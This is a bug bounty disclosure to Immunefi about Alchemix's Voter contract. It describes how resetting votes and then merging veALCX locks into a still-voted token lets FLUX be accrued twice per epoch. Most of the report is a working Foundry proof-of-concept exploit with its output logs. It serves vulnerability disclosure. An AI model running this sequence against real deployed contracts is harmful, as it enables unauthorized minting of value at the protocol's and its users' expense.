# 31329 - \[SC - Critical] Attacker can gain infinitive FLUX by repeating ...

Submitted on May 17th 2024 at 07:32:47 UTC by @Minato7namikazi for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31329

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Unauthorized minting of NFTs

## Description

## Brief/Intro

Attacker can gain infinitive FLUX by repeating this attack!

## Vulnerability Details

in the reset function in Voter contract which could be used only once per epoch , it accrueFlux for the tokenID and add the accrued amount in the unclaimed Flux balance , using the following scenario a malicious attacker could accrueFlux for tokenID already accrued previously in the same epoch.

### an example scenario

an attaker have 3 locks each one with 100k token

**ID1**

**ID2**

**ID3**

#### In the first epoch

he vote with the three tokenIDs

#### in the next epoch

he reset the voting for ID1 & ID2 and accrue their Flux ratio

fortunately here for the attacker ... the reset function abstain the voting status for the token id so it will be !VOTED

and the attacker will be able to merge into token voted in the previous epoch and didn't use reset in the new epoch yet

because merge() only require `require(!voted[_from], "voting in progress for token");`

it doesn't require the merged "to" token to be not voted .. only the first token

the attacker now could merge ID1 & ID2 to ID3

and use the reset function with the new total balance .. and accrue flux even if the same IDs tokens balance accrued flux previously in the same epoch!

## Impact Details

the suitable in-scope impact is **Unauthorized minting of NFTs** because this will enable an attacker to gain infinitive FLUX by repeating this tricky scenario

## Proof of concept

```

/*
       █▀█  ▀▄▀  █▀▄▀█ █ █▄░█ ▄▀█ ▀█▀ █▀█ 
       █▄█  █░█  █░▀░█ █ █░▀█ █▀█ ░█░ █▄█ 
*/


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/console.sol";
import "./BaseTest.sol";


contract MyTest is BaseTest { 


address public user = address(2);
uint256 internal constant ONE_WEEK = 1 weeks;
uint256 internal constant THREE_WEEKS = 3 weeks;
uint256 internal constant FIVE_WEEKS = 5 weeks;
uint256 internal constant MANYWEEKS = 52 weeks;

uint256 maxDuration = ((block.timestamp + MAXTIME) / ONE_WEEK) * ONE_WEEK;

 function setUp() public { 

      setupContracts(block.timestamp);

    }


  function _lockVeALCX(uint256 amount) internal returns (uint256) {

        deal(address(bpt), address(this), amount);
        IERC20(bpt).approve(address(veALCX), amount);
        return veALCX.createLock(amount, MAXTIME, false);

    } 

   function _setupgauge() internal {
        
        address alUsdGaugeAddress = voter.gauges(alUsdPoolAddress);

        address bribe1 = voter.bribes(alUsdGaugeAddress);


        vm.prank(voter.admin());
        voter.whitelist(usdt);

        vm.prank(address(alUsdGauge));
        IBribe(bribe1).addRewardToken(usdt);


        address alEthGaugeAddress = voter.gauges(alEthPoolAddress);
        address bribe2 = voter.bribes(alEthGaugeAddress);
       
    } 



  function test_theExpectedreturnsbeforetheExploit() public { 


        console.log("<---------------->");
        console.log("in this first test we preview how much the total flux balance of user should be in natural situation");
        console.log("after voting in an epoch then use reset function in the next epoch .... the user have 3 locks each one with 100k ");
        console.log("<---------------->");

        vm.startPrank(holder);

        uint256 id1 = _lockVeALCX(TOKEN_100K);
        uint256 id2 = _lockVeALCX(TOKEN_100K);
        uint256 id3 = _lockVeALCX(TOKEN_100K); 

        vm.stopPrank();


        _setupgauge();


        vm.startPrank(holder);

        
        address[] memory pools = new address[](1);
        address[] memory pools2 = new address[](1);
        uint256[] memory weights = new uint256[](1);
        pools[0] = alUsdPoolAddress;
        pools2[0] = alEthPoolAddress;
        weights[0] = 1;

        voter.vote(id1, pools, weights, 0);
        voter.vote(id2, pools2, weights, 0);
        voter.vote(id3, pools, weights, 0);


        uint256 unclaimedBalance11 = flux.getUnclaimedFlux(id1);

        console.log("The FLUX Balance of any id of the 3 now after voting is : ", unclaimedBalance11);


        skip(2 weeks + 2);

        vm.startPrank(address(voter));

        minter.updatePeriod();

        vm.stopPrank();

        vm.startPrank(holder);

        voter.reset(id1);
        voter.reset(id2);
        voter.reset(id3);

        uint256 unclaimedBalance2 = flux.getUnclaimedFlux(id1);

        console.log("The FLUX Balance of any id of the three after resetting is : ", unclaimedBalance2);

        console.log("The FLUX Balance of total user IDs after resetting in (normal situation) is : ", unclaimedBalance2 * 3);


        console.log("so that what should happen in normal .. the next we will preview the exploit that could totally take on the flux token system");

  

}

  function test_Exploit() public { 

      vm.startPrank(holder);


        uint256 id1 = _lockVeALCX(TOKEN_100K);
        uint256 id2 = _lockVeALCX(TOKEN_100K);
        uint256 id3 = _lockVeALCX(TOKEN_100K); 



        vm.stopPrank();


        _setupgauge();




        vm.startPrank(holder);

        
        address[] memory pools = new address[](1);
        address[] memory pools2 = new address[](1);
        uint256[] memory weights = new uint256[](1);
        pools[0] = alUsdPoolAddress;
        pools2[0] = alEthPoolAddress;
        weights[0] = 1;

        voter.vote(id1, pools, weights, 0);
        voter.vote(id2, pools2, weights, 0);
        voter.vote(id3, pools, weights, 0);



        uint256 unclaimedBalance11 = flux.getUnclaimedFlux(id1);

        console.log("The FLUX Balance of any id now is : ", unclaimedBalance11);



        skip(2 weeks + 2);

        vm.startPrank(address(voter));

        minter.updatePeriod();

        vm.stopPrank();

        vm.startPrank(holder);

        voter.reset(id1);
        voter.reset(id2);


        uint256 unclaimedBalance2 = flux.getUnclaimedFlux(id1);

        console.log("The FLUX Balance of id1 or id2 after resetting is : ", unclaimedBalance2);


        console.log("now we will merge id1 & id2 to id3");

        veALCX.merge(id1, id3);
        veALCX.merge(id2, id3);


        uint256 unclaimedBalance3 = flux.getUnclaimedFlux(id3);

        console.log("The id3 FLUX Balance after merging with the 2 ids is : ", unclaimedBalance3);

        voter.reset(id3);


        console.log("<---------------->");
        console.log("we can now accrue flux when resetting even if we already accrued previously for id 1 & 2 in the same epoch!!");


        uint256 unclaimedBalance4 = flux.getUnclaimedFlux(id3);

        console.log("The FLUX Balance after resetting the new merged token id3 is : ", unclaimedBalance4);

        console.log("<---------------->");
        console.log("If we subtract the total final flux balance with exploit - balance in normal sitaution(in test above)");
        console.log("the user now with the same balance in the previous test could gain 191234164129883298893351 more flux !");
        console.log("and the attacker can repeat that INFINITELY ");


  }

}
```

#### the result should be :

```
Ran 2 tests for src/test/poc.t.sol:MyTest
[PASS] test_Exploit() (gas: 4492738)
Logs:
  The FLUX Balance of any id now is :  99436076230339924252818
  The FLUX Balance of id1 or id2 after resetting is :  195036529680365287551119
  now we will merge id1 & id2 to id3
  The id3 FLUX Balance after merging with the 2 ids is :  489509135591070499355056
  <---------------->
  we can now accrue flux when resetting even if we already accrued previously for id 1 & 2 in the same epoch!!
  The FLUX Balance after resetting the new merged token id3 is :  776310495941146589249960
  <---------------->
  If we subtract the total final flux balance with exploit - balance in normal sitaution(in test above)
  the user now with the same balance in the previous test could gain 191234164129883298893351 more flux !
  and the attacker can repeat that INFINITELY

[PASS] test_theExpectedreturnsbeforetheExploit() (gas: 3702636)
Logs:
  <---------------->
  in this first test we preview how much the total flux balance of user should be in natural situation
  after voting in an epoch then use reset function in the next epoch .... the user have 3 locks each one with 100k
  <---------------->
  The FLUX Balance of any id of the 3 now after voting is :  99436076230339924252818
  The FLUX Balance of any id of the three after resetting is :  195036529680365287551119
  The FLUX Balance of total user IDs after resetting in (normal situation) is :  585109589041095862653357
  so that what should happen in normal .. the next we will preview the exploit that could totally take on the flux token system

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 40.91s (55.38s CPU time)

Ran 1 test suite in 42.20s (40.91s CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)

```
